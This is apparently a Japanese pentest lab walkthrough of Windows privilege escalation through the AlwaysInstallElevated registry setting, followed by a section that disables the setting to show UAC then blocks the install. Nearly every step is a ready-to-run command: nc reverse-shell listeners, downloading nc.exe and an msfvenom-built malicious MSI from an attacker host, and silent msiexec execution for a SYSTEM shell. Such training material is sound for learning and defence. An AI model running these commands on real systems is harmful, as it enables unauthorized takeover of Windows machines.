---
created: 2026-01-08 10:08
modified: 2026-02-20 16:15
environment: [OS/Windows]
vulnearability: [Regestry/AlwaysInstallElevated]
type: pentest-walkthrough
pentest_category: OS
platform: [PurpleFlair]
tools: []
cve: []
tags: 
---

# [Pentest-Walkthrough] OS - Project: AlwaysInstallElevated 権限昇格 基本

## 1. AlwaysInstallElevatedによる権限昇格

攻撃用マシンから攻略対象マシンに対して、testuserとしてRDP接続を行います。

```
xfreerdp /u:'testuser' /p:'testpass' /v:<target1_ip> /dynamic-resolution
```

### 1. リバースシェルの待ち受け

攻撃用マシンでncを実行してリバースシェルのリスナーを起動しましょう。

```
nc -vlnp <nc_port>
```

### 2. リバースシェルの確立

攻撃用マシンからnc.exeを転送しましょう。

まずは攻撃用マシンで、httpサーバをホストしましょう。

```
python -m http.server <http_port>
```

次に、nc.exeをワーキングディレクトリにコピーしましょう。

```
cp /usr/share/windows-binaries/nc.exe .
```

次に、攻略対象マシン上でcurlを用いてnc.exeの転送を行いましょう。

```
curl -O http://<attacker_ip>:<http_port>/nc.exe
```

攻略対象マシンでnc.exeを起動して、攻撃用マシンとリバースシェルを繋げましょう。

```
</path/to/nc.exe> <attacker_ip> <nc_port> -e cmd.exe
```

### 3. AlwaysInstallElevatedの確認

AlwaysInstallElevatedが有効になっているかどうかを確認しましょう。

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

AlwaysInstallElevatedの値が1となっていることを確認しましょう。

![[スクリーンショット 2026-01-08 10.33.26.png]]

### 4. 悪意あるmsiファイルの作成

msfvenomを使用して、リバースシェルを確立するためのmsiファイルを作成しましょう。

```
msfvenom -f msi -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<msfvenom_port> > <file_name>.msi
```

### 5. msiファイルの転送

作成したmsiファイルを攻略対象マシンへと転送しましょう。

攻撃用マシン上の既に確立したリバースシェルを使用します。

curlを用いてmsiファイルの転送を行いましょう。

ただし、リバースシェルの作成に32bit版のnc.exeを利用したため、cmd.exeは32bit版実行ファイルを探します。

攻略対象マシンには64bit版のcurl.exeのみが存在するため、Sysnative経由で実行します。

```
c:\windows\sysnative\curl -O http://<attacker_ip>:<http_port>/<file_name>.msi

C:\Users\testuser>c:\windows\sysnative\curl -O http://10.0.184.4:8000/evil.msi                         
c:\windows\sysnative\curl -O http://10.0.184.4:8000/evil.msi
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  156k  100  156k    0     0  10.8M      0 --:--:-- --:--:-- --:--:-- 16.9M
```

### 6. msiファイルの実行

新しいウィンドウでncを実行し待ち受け、作成したmsiファイルを実行しリバースシェルを確立しましょう。

攻撃用マシンにて、新たなncリスナーを実行しましょう。

```
nc -lnvp <msfvenom_port>
```

次に、msiファイルを実行してSystem権限のリバースシェルを確立しましょう。

```
msiexec /quiet /qn /i <file_name>.msi
```

![[スクリーンショット 2026-01-08 10.40.39.png]]

## 2. AlwaysInstallElevatedの無効化

AlwaysInstallElevatedを無効にしたときに、msiファイルを実行すると、UACのポップアップが表示されることを確認しましょう。

まず、攻撃用マシンから攻略対象マシンに対して、testuserとしてRDP接続を行います。

```
xfreerdp /u:'testuser' /p:'testpass' /v:<target1_ip> /dynamic-resolution
```

レジストリを操作するため、管理者権限で実行する必要があります。以下のコマンドをミッション1で取得したSYSTEM権限のリバースシェルから実行しましょう。

```
reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t "REG_DWORD" /d "0" /f


reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t "REG_DWORD" /d "0" /f
```

AlwaysInstallElevatedを無効化した場合に一般ユーザ権限でmsiファイルを実行すると、RDPした攻略対象マシン上でUACのポップアップが出ることを確認します。

![[スクリーンショット 2026-01-08 10.46.03.png]]

以下のコマンドをミッション1で取得したtestuser権限のリバースシェルから実行しましょう。

```
msiexec /i <file_name>.msi
```

![[スクリーンショット 2026-01-08 10.49.59.png]]